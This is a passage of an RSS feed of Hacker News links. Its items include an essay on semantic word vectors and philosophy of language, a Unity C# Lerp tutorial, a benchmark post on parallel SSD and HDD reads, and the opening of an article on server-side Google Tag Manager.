he write? Who is his audience? What do they need from him?</p><p>Today, I'm building my niche in the attention economy. Every week I'm proud to share close to 800 words across my platform. It's fun to go back and review previous essays to see the difference in the thinking and the writing.</p><p>Another key thing I learned is the importance of brevity. I know I have plenty of room for improvement. Still, I'm putting in the hours and enjoying the process. Hiring a coach made a huge difference.</p></div></div></div>]]>
            </description>
            <link>https://www.arilewis.com/aris-posts/nb79cps2558ad5k88qusj2g761nph0</link>
            <guid isPermaLink="false">hacker-news-small-sites-24275828</guid>
            <pubDate>Tue, 25 Aug 2020 20:39:44 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[If Humans Spoke in Vectors]]>
            </title>
            <description>
<![CDATA[
Score 6 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24275741">thread link</a>) | @KhoomeiK
<br/>
August 25, 2020 | https://rohan.bearblog.dev/humans-spoke-vectors/ | <a href="https://web.archive.org/web/*/https://rohan.bearblog.dev/humans-spoke-vectors/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
    <div><p>Would we be as successful as we are now? I'd say no.</p>
<h3 id="what-are-semantic-vectors">What are Semantic Vectors</h3>
<p>But first, what does it even mean to communicate with vectors? Communication can be defined as the transfer of an idea from one person to another, and a semantic vector essentially tries to capture an idea in a numerical representation. Vectors have grown vastly in popularity in Natural Language Processing in the past decade, and now virtually all research in the field revolves around a basic assumption that vectors can effectively convey ideas.</p>
<p>The first commonly used semantic vector model, generally known as word embedding (as in embedding a word in a vector space), was <a href="https://en.wikipedia.org/wiki/Word2vec">word2vec</a> in 2013. Word2vec learns vector representations of words by encouraging words that occur in similar contexts to have similar vector representations. So, for example, if we have a corpus with examples like "the dog chased the cat", "the canine chased the cat", and "the rat feared the cat", word2vec would learn to represent "dog" and "canine" with similar embeddings. The generated vectors are generally hundreds of dimensions, but the embeddings for "dog", "canine", and "rat" in our example might look something like [0.3, 0.1, 0.8], [0.3, 0.2, 0.8], and [0.4, 0.6, 0.7], respectively. Notice the similarity of "dog" and "canine" due to occurrence in similar contexts in our corpus.</p>
<p>These were known as "distributional embeddings", because they were found to distribute semantic categories across vector dimensions. A commonly cited example points out how if you subtract the word embedding for "man" from "king", and then add "woman", you get "queen". So these high-dimensional vectors that learn word representations just from context are able to pretty accurately understand the relationships between words. Sure, they might not know what a king looks like, what he does, and his historic relevance, but they do know that he's similar to a man in some ways and similar to a queen in other ways.</p>
<h3 id="word-relations-and-differance">Word Relations and Différance</h3>
<p>These relations are what many of us will resort to when asked about the structure of language. A dictionary, after all, just refers us to other words when asked for any definition. The implicit conclusion here that without grounding in the real world, all words are purely relational, bears striking resemblance to <a href="https://en.wikipedia.org/wiki/Differance">Derrida's Différance</a>. The core of Différance, which became fundamental to Deconstruction and the Postmodernism that now dominates humanities, is the idea that words gain meaning only through their difference with (and deference to) others. Only in the real world, with speech, outside of the realm of paper, would Derrida acknowledge that an uttered symbol can present real meaning.</p>
<p>But virtually all Machine Learning research in Natural Language Understanding focuses on written text, so can any real meaning be derived? Again, I'd say no. All the colossal Deep Learning architectures that seem to dominate NLP these days don't actually understand language—they've just learned correlations between words in manners ultimately quite similar to the original word2vec. This is quite obvious with <a href="https://arxiv.org/abs/2005.14165">OpenAI's GPT-3</a>, which is able to produce text that sounds very realistically written by a human, but doesn't form any coherent meaning. The model has essentially memorized all the relationships between words from a huge corpus of internet text, but it can't know what those words mean without some kind of grounding in the physical world.</p>
<p>Some meanings can be largely summed up in these simple vector relationships, but others are quite a bit more complex. The relationship between "predator" and "prey", for example, is abstract enough that I'd pretty confidently say their meanings can be captured in some kind of vector representation. But the relationship between "knife" and "onion"? You as a reader probably know how those words are related, but I can't even begin to capture the nature of their relationship in language. Yes, we can "cut an onion with a knife" (and <a href="https://transformer.huggingface.co/doc/gpt2-large">GPT-2</a>) is actually capable of predicting "knife" here), but how does this action actually work? What is the purpose it serves? What do the words really mean?</p>
<h3 id="grounding-meaning">Grounding Meaning</h3>
<p>But we might be confusing two things here. Though these language models learn the meanings of words through their relationships and co-occurence with one another, we can think about definitions on their own as well. A classic example from Indian philosophy is that of the pot. What does it mean to be a pot? As humans, we're great at generating <a href="https://en.wikipedia.org/wiki/Theory_of_forms">Platonic Forms</a> from our real world experiences. Once we've seen a few pots, our brains are able to construct a pretty accurate generalized Form for pots, and when we see one again, we're easily able to recognize that it's another instance of this Form. This representation our brain learns is so much more information dense than what can be gleaned from language. It's imbued with an innate understanding of visual and physical attributes.</p>
<p><a href="https://arxiv.org/abs/1810.04805">Google's BERT</a> might read an article about pots and then tell us that pots are often made of clay, can be used as cooking vessels, and have been found in China from 20,000 BC. But ask BERT whether a pot with holes would be able to hold water and it'd have no idea. This could certainly be construed as a language issue instead of a grounding issue. Maybe we could find some more textual data that relates pots to holes and holes to water so that BERT can learn better semantic representations for them. The real solution to me though, would be to ground the language model in the physical world, perhaps with some kind of Reinforcement Learning strategy. If a picture is worth a thousand words and a video is worth a million, the ability to interact with a physical environment must carry a tremendous amount of semantic information.</p>
<h3 id="composing-and-comprehending-meaning">Composing and Comprehending Meaning</h3>
<p>While grounding is vital for learning accurate word representations, something even more elementary to me is the <a href="https://en.wikipedia.org/wiki/Principle_of_compositionality">compositionality of language</a>. Compositionality is the idea that the meaning of a sentence is a unique, synergistic result of combining the constituent words within it. It's closely related to Noam Chomsky's <a href="https://en.wikipedia.org/wiki/Recursion#In_language">Recursion</a>, which he asserts is the fundamental element underlying all human language. Recursion is the ability for us to infinitely nest expressions in language, much like this very sentence, where I can just continue chaining on clauses, again and again, until I desire to stop, at which point I may place a period in writing, or a pause in speech, and then continue on to present yet another idea.</p>
<p>And upon the conclusion of that sentence, there is a moment of understanding, where the meaning that I intend to express bursts forth in its entire form in your mind. Bhartrhari, an Indian linguistic philosopher of the 5th century, termed this "bursting forth" as "<a href="https://en.wikipedia.org/wiki/Sphota">sphoṭa</a>". The symbols, whether as letters on paper or sounds in speech, agglomerate together to create a unified meaning that is entirely comprehended in a single moment. Later on, the Mimamsakas built on this idea to emphasize that a sphoṭa is not indivisible as originally conceptualized, but rather is the result of the hierarchical composition of sounds, words, and clauses through grammatical structures.</p>
<p>The ability to compose words to generate coherent moments of understanding is vital to language in my opinion, and I'm skeptical of the ability of word vector embeddings to do this effectively. There has certainly been progress on this front in ML with <a href="https://arxiv.org/abs/1706.03762">Transformer architectures</a>. Previously, RNNs dominated the NLP landscape. These neural nets linearly process language one word at a time, feeding the collective representation of the sentence so far forward until an entire representation is outputted at the end.</p>
<p>The problem here, of course, is the severe loss of information due to the lack of syntax trees. While you may not actively think about parsing syntax trees of sentences, it's an essential prior for proper understanding of any language. Some languages like Japanese put their verbs at the end of the sentence ("cat mouse chased") whereas others like English put our verbs between the subject and object ("cat chased mouse"). It might seem trivial, but syntax has wide-reaching consequences for language understanding. If you were reading a text in an Object-Verb-Subject language ("mouse chased cat") without knowledge of the syntax and the consequent relations constructed in the sentence, you'd be very confused.</p>
<p>An interesting side-note here is that speakers of left-branching languages (which put the verb at the end of a clause) have been <a href="https://www.nature.com/articles/s41598-018-37654-9">shown</a> to have better short-term memories than right-branching speakers. This is theorized to be because speakers must maintain the multiple elements in their memory for longer before their related together by the verb. In a right-branching language, the sphoṭa builds from a subject, to the subject's relationship, to the subject's relationship to the object. But with a left-branching language, one first perceives the sphoṭa of the subject, remembers it while perceiving the sphoṭa of the object, then composes those sphoṭas in the final verbal relation.</p>
<p>The true nature of a sentence is more like a graph/network or a tree, and the fact that we communicate it linearly is more of an evolutionary hack we've developed to speak out of our single mouth. So when attentional models and Transformers came along, they blew RNNs out of the water because they were implicitly capable of understanding tree structures. The attention mechanism of a Transformer is much what it sounds like, it learns to pay attention to the right things at the right time. When given a sentence "the cat chased the mouse", for the first "the" it might attend to "cat", and for "chased" it might attend to "cat" and "mouse" in unique ways (which are the verb's subject and object). Attention learns how to correctly identify the syntax relationships for sentences, thereby arriving at better semantic representations.</p>
<h3 id="logic-or-statistics">Logic or Statistics</h3>
<p>Transformers, …</p></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://rohan.bearblog.dev/humans-spoke-vectors/">https://rohan.bearblog.dev/humans-spoke-vectors/</a></em></p>]]>
            </description>
            <link>https://rohan.bearblog.dev/humans-spoke-vectors/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24275741</guid>
            <pubDate>Tue, 25 Aug 2020 20:29:29 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Unity Lerp]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24275730">thread link</a>) | @generalistp
<br/>
August 25, 2020 | https://generalistprogrammer.com/unity/unity-2d-lerp-tutorial-in-depth/ | <a href="https://web.archive.org/web/*/https://generalistprogrammer.com/unity/unity-2d-lerp-tutorial-in-depth/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="text">
	
<p>Welcome to this Unity 2D Lerp Tutorial. The Unity 2D Lerp function is often used to move objects along a path or to change values along a path. </p>



<p>However in essence LERP is code word for Linear Interpolation, but what is linear interpolation?</p>



<p>Well interpolation is a mathematical concept which is used to fit points within other points.</p>



<p>Essentially how this works is it takes a set of points and estimates other points for a given x or y value on a graph. </p>



<h2>Visually explaining Lerp</h2>



<p>Here is essentially what this would look like.</p>



<figure><img loading="lazy" width="570" height="400" src="https://q5q6q2e3.stackpathcdn.com/wp-content/uploads/2020/04/image-41.png" alt="Unity 2D Lerp Tutorial - Linear interpolation graph" data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20570%20400'%3E%3C/svg%3E" data-lazy-src="https://q5q6q2e3.stackpathcdn.com/wp-content/uploads/2020/04/image-41.png"></figure>



<p>To explain this in brief. The green dots are all the co ordinates that are known.</p>



<p>The red one is a estimation of what the point will look like at that given x or y. So how Lerp works in unity is it will use the first point you give it and the 2nd point you give. </p>



<p>It and create estimations for the time value you pass in. By doing so you can get linear values back between the point 1 and point 2. </p>



<p>With these values you can modify scales, object positions etc, anything that has a linear motion or change. </p>



<p>Here is what the Lerp function definition looks like.</p>



<p>public static&nbsp;<strong>Lerp</strong>(Vector2&nbsp;<strong>a</strong>,&nbsp;Vector2&nbsp;<strong>b</strong>, float&nbsp;<strong>t</strong>);</p>



<p>So in terms of our graph Vector2 a could be the first green dot at the bottom of our graph and Vector2 b could be our last one at the top. </p>



<p>The float t, will move us along on the x axis and give us estimates of the line drawn between Vector a and Vector b. </p>



<p>In so doing if we step the time in our Lerp function we would be able to animate, move or modify unity game object.</p>



<p>I hope this makes sense. Can be quite tricky without a mathematical background. </p>



<p>You might begin to understand it more in depth with the following demonstrations.</p>



<h2>Demonstrating unity lerp between two positions</h2>



<p>Let’s start off with a new unity project. Open up unity hub and create a project called unity 2d lerp tutorial.</p>



<figure><img loading="lazy" width="815" height="386" src="https://q5q6q2e3.stackpathcdn.com/wp-content/uploads/2020/04/image-42.png" alt="Demonstrating unity lerp translate" data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20815%20386'%3E%3C/svg%3E" data-lazy-src="https://q5q6q2e3.stackpathcdn.com/wp-content/uploads/2020/04/image-42.png"></figure>



<p>So generally when we say translate in the same sentence as lerp we talking about different things really. </p>



<p>Lerp will give us the next co ordinate in our series, where translate will add values to our vector. </p>



<p>It technically would be possible to simulate a lerp with translate. By using a linear function to determine the gradient of our linear graph. </p>



<p>However let us stick to the lerp way of doing a “translate”. This will be using the time function. Let’s start by adding a basic square to our scene.</p>



<p>So in the assets tab add a square 2d sprite like this.</p>



<figure><img loading="lazy" width="748" height="500" src="https://q5q6q2e3.stackpathcdn.com/wp-content/uploads/2020/04/image-43.png" alt="unity lerp between two positions tutorial" data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20748%20500'%3E%3C/svg%3E" data-lazy-src="https://q5q6q2e3.stackpathcdn.com/wp-content/uploads/2020/04/image-43.png"></figure>



<p>Drag it into your hierarchy.</p>



<figure><img loading="lazy" width="306" height="114" src="https://q5q6q2e3.stackpathcdn.com/wp-content/uploads/2020/04/image-44.png" alt="" data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20306%20114'%3E%3C/svg%3E" data-lazy-src="https://q5q6q2e3.stackpathcdn.com/wp-content/uploads/2020/04/image-44.png"></figure>



<p>Let’s now create the first basic c# script to handle a “translate”. Go ahead and right click in the assets tab and create a new c# script and call it translate lerp.</p>



<figure><img loading="lazy" width="853" height="446" src="https://q5q6q2e3.stackpathcdn.com/wp-content/uploads/2020/04/image-45.png" alt="" data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20853%20446'%3E%3C/svg%3E" data-lazy-src="https://q5q6q2e3.stackpathcdn.com/wp-content/uploads/2020/04/image-45.png"></figure>



<figure><img loading="lazy" width="146" height="153" src="https://q5q6q2e3.stackpathcdn.com/wp-content/uploads/2020/04/image-46.png" alt="unity lerp translate tutorial" data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20146%20153'%3E%3C/svg%3E" data-lazy-src="https://q5q6q2e3.stackpathcdn.com/wp-content/uploads/2020/04/image-46.png"></figure>



<p>Open that up in visual studio code. Here is what our code is going to look like.</p>



<pre><code lang="csharp">using System.Collections;
using System.Collections.Generic;
using UnityEngine;

public class TranslateLerp : MonoBehaviour
{
    // Start is called before the first frame update
    float accum = 0.0f;
    Vector2 p1, p2;
    void Start()
    {
         p1 = new Vector2(0, 0);
         p2 = new Vector2(20, 20);
        
    }

    // Update is called once per frame
    void Update()
    {
        accum += 1.1f * Time.deltaTime;
        this.transform.position = Vector2.Lerp(p1,p2, accum);
    }
}
</code></pre>



<p>Save that off and attach that to our square by dragging it into the insepector.</p>



<figure><img loading="lazy" width="365" height="447" src="https://q5q6q2e3.stackpathcdn.com/wp-content/uploads/2020/04/image-47.png" alt="unity lerp smooth tutorial" data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20365%20447'%3E%3C/svg%3E" data-lazy-src="https://q5q6q2e3.stackpathcdn.com/wp-content/uploads/2020/04/image-47.png"></figure>



<p>Run that and you should get a square moving on the screen. So very simple how this works. </p>



<p>First we have our two vectors point 1 and point 2. We then lerp between the two passing the lerp function our deltaTime * 1.1f. The 1.1f which is our speed at which we want to move our object. </p>



<p>We assign this to a accum variable which is our lerp float over time. </p>



<h2>Modifying this code to lerp scale</h2>



<p>All we now need to do to get unity lerp to scale is change the code to have this instead.</p>



<pre><code lang="csharp">this.transform.localScale = Vector2.Lerp(p1,p2, accum);</code></pre>



<figure><img loading="lazy" width="402" height="255" src="https://q5q6q2e3.stackpathcdn.com/wp-content/uploads/2020/04/image-48.png" alt="unity lerp scale tutorial" data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20402%20255'%3E%3C/svg%3E" data-lazy-src="https://q5q6q2e3.stackpathcdn.com/wp-content/uploads/2020/04/image-48.png"></figure>



<h2>Unity lerp smooth step</h2>



<p>Want to smooth out the motion try this.</p>



<pre><code lang="csharp">using System.Collections;
using System.Collections.Generic;
using UnityEngine;

public class TranslateLerp : MonoBehaviour
{
    // Start is called before the first frame update
    float accum = 0.0f;
    Vector2 p1, p2;
    void Start()
    {
         p1 = new Vector2(0, 0);
         p2 = new Vector2(20, 20);
        
    }

    // Update is called once per frame
    void Update()
    {
        accum += 1.1f * Time.deltaTime;
        this.transform.position = Vector2.Lerp(p1,p2, Mathf.SmoothStep(0,1,accum));
    }
}
</code></pre>



<p>Here we use Mathf.SmoothStep to control the estimation.</p>



<p>That’s it for this tutorial. Going to end it here and in the next section I will be answering some frequently asked questions. </p>


        <section>
            <div>
				<h2>How do I do a smooth lerp in unity?</h2>                <p>
						To do a smooth lerp you can use a smoothing function like Mathf.SmoothStep.                    </p>
            </div>
        </section>
	        <section>
            <div>
				<h2>How do I do lerp on scale in unity?</h2>                <p>
						To lerp on scale in unity you can simply provide 2 vectors and lerp over the localScale like this.<br>accum += 1.1f * Time.deltaTime;<br>this.transform.localScale = Vector2.Lerp(p1,p2, accum);                    </p>
            </div>
        </section>
	        <section>
            <div>
				<h2>How do I do a translate lerp in unity?</h2>                <p>
						You can lerp between two points like this.<br>accum += 1.1f * Time.deltaTime;<br>this.transform.position= Vector2.Lerp(p1,p2, accum);                    </p>
            </div>
        </section>
	



<h2>Some final words</h2>



<p>I hope this tutorial was useful and helped you understand lerp in a new way. If you want to support me and my content please check out my skillshare course here: </p>



<p><a href="https://skl.sh/2YhzEfe" rel="nofollow">https://skl.sh/2YhzEfe</a></p>



<p>If you prefer watching video over reading tutorials, why not subscribe to my YouTube channel over here:&nbsp;<a href="https://www.youtube.com/channel/UC1i4hf14VYxV14h6MsPX0Yw?sub_confirmation=1">https://www.youtube.com/channel/UC1i4hf14VYxV14h6MsPX0Yw?sub_confirmation=1</a></p>



<p>Here are also some other tutorials you might be interested in:</p>



</div></div>]]>
            </description>
            <link>https://generalistprogrammer.com/unity/unity-2d-lerp-tutorial-in-depth/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24275730</guid>
            <pubDate>Tue, 25 Aug 2020 20:28:14 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Performance Impact of Parallel Disk Access]]>
            </title>
            <description>
<![CDATA[
Score 10 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24275722">thread link</a>) | @pkolaczk
<br/>
August 25, 2020 | https://pkolaczk.github.io/disk-parallelism/ | <a href="https://web.archive.org/web/*/https://pkolaczk.github.io/disk-parallelism/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>
  <header>
  
  <time datetime="2020-08-24T00:00:00+00:00">August 24, 2020</time>
</header>

  <p>One of the well-known ways of speeding up a data processing task is partitioning the data into smaller
chunks and processing the chunks in parallel. Let’s assume we can partition the task easily, or the input data is already 
partitioned into separate files which all reside on a single storage device. Let’s also assume the algorithm we run on those
data is simple enough so that the computation time is not a bottleneck. How much performance can we gain by reading the files in parallel? 
Can we lose any?</p>

<!--more-->



<p>While working on <a href="https://github.com/pkolaczk/fclones">fclones</a> duplicate file finder,
I’ve put a lot of effort into making it as fast as possible by leveraging capabilities of modern hardware.
That’s why I designed my program in a way that all data processing stages can be easily parallelized. 
The newest version at the moment of writing this post (0.7.0) allows to set thread pools for random I/O 
and sequential I/O separately, and can adapt the settings to different types of storage devices.</p>

<p>In this blog post I’m presenting the results of a few experiments I’ve made separately on SSD and HDD.
All the experiments were perfomed on either a Dell Precision 5520 laptop with a 4-core Xeon and a 512 NVMe SSD, from 2016, 
running Ubuntu Linux 20.04, or an older Dell M4600 with a 7200 RPM Toshiba HDD running Mint Linux 19.03.</p>


<p>The most time-consuming part of the job is actually reading
the data from disk into memory in order to compute hashes. The number of files is typically large (thousands or even millions) 
and the problem of computing their hashes is embarrassingly parallel. 
The first thing my duplicate finder does is scanning directory tree and fetching file metadata like file lenghts and inode identifiers. 
This process issues a lot of random I/O requests. As expected, the performance gains from multithreading were huge, 
which is illustrated in Fig.&nbsp;1.</p>

<div>
    
    
    <p><span> Fig.1: Time to fetch metadata of ~1.5 million file entries on an SSD</span>
</p></div>

<p>In the next stage, the files matching by size are compared by hashes of their initial 4 kB block. This involves a lot of random I/O as well – 
for each file, <code>fclones</code> opens it, reads the first 4 kB of data, computes the hash and closes the file, then moves to the next file. 
SSDs are great at random I/O, and high parallelism level leads to big wins here as well (Fig.&nbsp;2). It was surprising to me
that even 64 threads, which are far more than the number of CPU cores (4 physical, 8 virtual), still improved the performance.
I guess that with requests of such a small size to such a fast storage, you need to submit really many of them to keep 
the SSD busy.</p>

<div>
    
    
    <p><span> Fig.2: Time to hash initial blocks of ~1.2 million files on an SSD</span>
</p></div>

<p>Let’s look at <code>iostat</code>. With only 1 thread, <code>iostat</code> reports CPU to be mostly idle, but
the SSD utilization is at 100%.</p>

<pre>avg-cpu:  %user   %nice %system %iowait  %steal   %idle
           2,39    0,00    5,03    5,03    0,00   87,55

Device            r/s     rMB/s   rrqm/s  %rrqm r_await rareq-sz   aqu-sz  %util
nvme0n1       5458,00     21,32     0,00   0,00    0,11     4,00     0,00 100,00
</pre>

<p>Does it mean the SSD is already at its 100% performance? No, because 
<code>%util</code> is calculated as the ratio of <em>wall clock time</em> the device is serving requests. 
This doesn’t account for effects of submitting multiple requests at the same time.
It looks like my SSD is very happy to receive more load. With 64 threads,
<code>%util</code> is still at 100%, but the served read request rate went up by over 40 times:</p>

<pre>avg-cpu:  %user   %nice %system %iowait  %steal   %idle
          28,46    0,00   66,92    4,62    0,00    0,00

Device            r/s     rMB/s   rrqm/s  %rrqm r_await rareq-sz   aqu-sz  %util
nvme0n1     223974,00    874,90     0,00   0,00    0,17     4,00     0,00 100,00
</pre>

<p>BTW: why the average queue size <code>aqu-sz</code> remains 0,00 even under 64 threads remain a mystery to me. 
Feel free to drop any clues in the comments.</p>

<p>How do I known the CPU is not the main bottleneck here then? The CPU load numbers given by <code>iostat</code> are pretty high, aren’t they?
I measured how much time it takes to do the task when all the data were cached, by running it again, without prior dropping caches. 
When all cached, the metadata scanning took 1.5&nbsp;s and the partial hashing took 1.7&nbsp;s. This is still
significantly faster than when physical reads were involved, so nope, 
I/O is still the major bottleneck, even with 64 threads.</p>



<p>And what about the sequential I/O reads? Does parallelizing the sequential I/O improve speed as well?
It looks like it does, although not by as much as for random I/O (Fig.&nbsp;3).
The last stage of <code>fclones</code> algorithm is hashing full files – in this experiment the files were mostly JPG and RAW images, 
about 10 MB large on average. Gains seem to hit a plateau a bit earlier – after 8 threads. In this case the operating 
system has an opportunity to prefetch data, so
it can keep the SSD busy even when my application is not asking for data for a while.</p>

<div>
    
    
    <p><span> Fig. 3: Time to hash 21.6 GB of data read from an SSD in function of number of threads</span>
</p></div>


<p>Contrary to an SSD, a spinning drive has a large seek-latency and it can serve I/O requests
at much lower rate. Hence, we can definitely expect random I/O to be much slower on an HDD than on an SSD. 
But can we expect any performance gains from reading in parallel? 
My initial thought was there shouldn’t be any visible gains, because a single HDD can only serve 
a single read request at a given time, then it has to reposition the heads to “jump” to another file, and 
this looks very “sequentially” in principle. Having a large number of requests piled up in the queue 
shouldn’t change anything: the HDD would handle them in a sequence anyways. 
An HDD is also slow enough that even a single fast thread should keep it fully busy with at 
least one request ready to serve at any time.</p>

<p>I was wrong. It turns out that for small, random I/O requests there are noticeable gains from parallelism 
even on an HDD (Fig. 4). But this happens for a different reason than on SSD. 
The seek latency depends heavily on the <em>order</em> of the I/O requests. If the process submits more
I/O requests from multiple threads, the operating system can <em>reorder</em> them by physical data location, thus minimizing
the distance the HDD heads have to travel.</p>

<div>
    
    
    <p><span> Fig.4: Time to hash initial blocks of 46,165 files on a 7200 RPM HDD</span>
</p></div>


<p>Unfortunately, when reading larger chunks of data sequentially, using multi-threding actually hurts the throughput (Fig.&nbsp;5).
This is because the operating system interleaves the I/O requests coming from different threads and the HDD would have
to reposition the heads frequently jumping from one file to another. How much throughput is lost depends heavily on the operating
system and its configuration, but generally I’d expect this to be a factor 2x-10x.</p>

<div>
    
    
    <p><span> Fig.5: Time to hash 1.7 GB of data on a 7200 RPM HDD</span>
</p></div>

<p>One way of solving this problem in an application is to not allow many threads to contend for the same HDD device at the OS level, and 
instead make the application take some control over the I/O request scheduling by itself.
You can use a dedicated single thread to handle all I/O to a single spinning drive (this is what <code>fclones</code> does since version 0.7.0),
or guard I/O operations by a critical section (mutex) associated with each HDD and locked at a granularity coarse enough that
seek time doesn’t matter. I don’t recommend making the whole application single-threaded, because that would disallow
issuing parallel requests to multiple devices and it wouldn’t allow the gains outlined above.</p>

<p>Additionally, many operating systems allow to tell the kernel that the application will be reading the file data sequentially. 
For example in Linux, after opening the file, just call <a href="https://man7.org/linux/man-pages/man2/posix_fadvise.2.html"><code>posix_fadvise</code></a> with <code>POSIX_FADV_SEQUENTIAL</code>:</p>

<div><div><pre><code><span>use</span> <span>std</span><span>::</span><span>fs</span><span>::</span><span>*</span><span>;</span>
<span>use</span> <span>nix</span><span>::</span><span>fcntl</span><span>::</span><span>*</span><span>;</span>
<span>let</span> <span>file</span> <span>=</span> <span>File</span><span>::</span><span>open</span><span>(</span><span>"foo.txt"</span><span>)</span><span>?</span><span>;</span>
<span>let</span> <span>errno</span> <span>=</span> <span>posix_fadvise</span><span>(</span><span>file</span><span>.as_raw_fd</span><span>(),</span> <span>0</span><span>,</span> <span>0</span><span>,</span> <span>PosixFadviseAdvice</span><span>::</span><span>POSIX_FADV_SEQUENTIAL</span><span>)</span><span>?</span><span>;</span>
</code></pre></div></div>

<p>Internally this option increases the size of the read-ahead buffer, so the system can fetch data in larger chunks, 
potentially reducing the number of seeks. The effects of this flag are clearly visible and it improves performance of parallel access, 
but it is not strong enough to reduce the seek overhead to zero. Interestingly, I haven’t observed any effects 
of this flag on single-threaded throughput in my test, but YMMV.</p>


<ul>
  <li>Random I/O and reading metadata benefits from parallelism on both types of drives: SSD and HDD</li>
  <li>SSDs generally benefit from parallelism much more than HDDs</li>
  <li>Parallel access to HDD when reading large chunks of data sequentially can deteriorate performance</li>
  <li>Calling <code>posix_fadvise</code> to inform the system about sequential access pattern improves read throughput slightly
when sharing the device between multiple threads on Linux</li>
</ul>


  
    <hr>
    
    
    
  
</article></div>]]>
            </description>
            <link>https://pkolaczk.github.io/disk-parallelism/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24275722</guid>
            <pubDate>Tue, 25 Aug 2020 20:27:08 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Server-Side Tagging in Google Tag Manager]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 2 (<a href="https://news.ycombinator.com/item?id=24275661">thread link</a>) | @jlbnjmn
<br/>
August 25, 2020 | Https://www.simoahava.com/analytics/server-side-tagging-google-tag-manager | <a href="https://web.archive.org/web/*/Https://www.simoahava.com/analytics/server-side-tagging-google-tag-manager">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<div>
<p>Ever since <strong>Server-side tagging</strong> was <a href="https://twitter.com/SimoAhava/status/1222459714614841346?s=20">publicly announced</a> at <a href="https://superweek.hu/">SUPERWEEK 2020</a>, Google and the trusted tester community have been hard at work, building something that just might change the landscape of digital analytics for good.</p>
<p><a href="https://tagmanager.google.com/">Google Tag Manager</a> has now released Server-side tagging into <strong>public beta</strong>. In this lengthy article, we’ll take a look at what Server-side tagging is, how it should (and should not) be used, and what its implications are on the broader digital analytics community.</p>
<p><a href="https://www.simoahava.com/images/2020/07/server-side-tagging-google-tag-manager.jpg" title="Server-side tagging">
<img data-src="https://www.simoahava.com/images/2020/07/server-side-tagging-google-tag-manager.jpg#ZgotmplZ" alt="Server-side tagging" src="https://www.simoahava.com/images/2020/07/server-side-tagging-google-tag-manager.jpg#ZgotmplZ">
</a>
</p>
<p>In short, <strong>Server-side tagging</strong> means running a <strong>Google Tag Manager container</strong> in a server-side environment (at the time of writing, the only available environment is the <a href="https://cloud.google.com/">Google Cloud Platform</a>, though I’m certain more options will become available in good time).</p>
<p>Many of the <a href="#key-benefits">benefits</a> and <a href="#key-concerns">concerns</a> are tackled in their respective chapters. Even so, I want to emphasize that Server-side tagging has the potential to overturn the current dynamic of data collection and governance for an organization. You <a href="#full-control-and-ownership-of-the-data-collected-by-the-container"><strong>own</strong> and have <strong>full control</strong></a> over the server-side environment. You have access to <strong>tools</strong> and <strong>methods</strong> to thoroughly <a href="#clean-up-and-validate-payloads">vet and validate the traffic</a> between network sources and your advertising and analytics endpoints.</p>
<p>You can run a fully functional digital analytics and marketing setup without loading <em>any</em> third-party code in the user’s browser or device. With appropriate monitoring in place, you can say <a href="#more-control-over-http-traffic">goodbye to PII and credential leaks</a>, cross-site tracking traps, and bloated third-party JavaScript <a href="#reduced-client-load">encumbering the client</a>.</p>
<p>Server-side tagging utilizes many of the concepts familiar to Google Tag Manager users:</p>
<ul>
<li>
<p>There are <strong>tags</strong> which fire on <strong>triggers</strong> and pull in data from <strong>variables</strong>.</p>
</li>
<li>
<p>New container <strong>versions</strong> can be <strong>previewed</strong> and <strong>published</strong>.</p>
</li>
<li>
<p>Users can create their own <a href="https://www.simoahava.com/analytics/custom-templates-guide-for-google-tag-manager/"><strong>custom templates</strong></a>.</p>
</li>
</ul>
<p>However, there are new, fundamentally different features that introduce something of a <strong>paradigm shift</strong> to the type of dynamic tagging that Google Tag Manager promotes.</p>
<ul>
<li>
<p>The container itself is a new <a href="#server-container"><strong>Server</strong></a> type; different from the web, app, and AMP containers that precede it.</p>
</li>
<li>
<p>Instead of trigger events, processes are initialized by <strong>incoming HTTP requests</strong>.</p>
</li>
<li>
<p>These requests are digested by a new type of GTM entity: <strong>a <a href="#clients-and-tags">Client</a></strong>.</p>
</li>
<li>
<p>The Client parses the requests, generates an <strong>event data object</strong>, and feeds this into a <strong>virtual container</strong>, where tags can use this event object to map and send data to their endpoints.</p>
</li>
</ul>
<p><a href="https://www.simoahava.com/images/2020/08/preview-example.jpg" title="Example from preview mode">
<img data-src="https://www.simoahava.com/images/2020/08/preview-example.jpg#ZgotmplZ" alt="Example from preview mode" src="https://www.simoahava.com/images/2020/08/preview-example.jpg#ZgotmplZ">
</a>
</p>
